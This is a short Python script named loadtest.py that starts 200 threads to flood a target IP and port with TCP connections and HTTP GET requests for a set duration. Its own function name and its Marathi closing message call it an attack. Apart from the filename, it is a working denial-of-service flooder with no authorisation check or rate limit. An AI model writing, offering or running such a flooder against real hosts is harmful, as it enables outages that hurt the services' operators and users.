# loadtest.py
import socket
import threading
import sys
import time

ip = sys.argv[1]
port = int(sys.argv[2])
duration = int(sys.argv[3])

timeout = time.time() + duration

def attack():
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(b"GET / HTTP/1.1\r\nHost: %b\r\n\r\n" % ip.encode())
            s.close()
        except:
            pass

threads = []

for _ in range(200):  # जास्त threads = जास्त load
    t = threading.Thread(target=attack)
    t.start()
    threads.append(t)

for t in threads:
    t.join()

print("✅ Attack संपला!")